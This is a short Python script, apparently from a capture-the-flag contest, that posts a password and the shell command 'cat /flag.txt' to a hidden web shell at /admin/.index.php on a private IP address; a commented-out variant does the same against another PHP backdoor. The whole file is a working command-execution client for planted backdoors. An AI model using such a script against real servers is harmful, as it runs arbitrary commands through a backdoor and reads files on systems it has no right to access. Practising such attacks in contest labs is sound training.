# -*- coding: utf-8 -*-
"""
Created on Sun Jul  7 10:09:59 2019

@author: 24592
"""

import requests

#url = 'http://10.188.14.15/yi.php'
#data = {'hash':'2dbff8a44d2ca2f44ab5376c4f7ccf99','casuall':'cat flag.txt'}
url = 'http://10.188.14.15:80/admin/.index.php'
data = {'pass':'poxiao','a':'cat /flag.txt'}

r = requests.post(url,data)
print(r.text)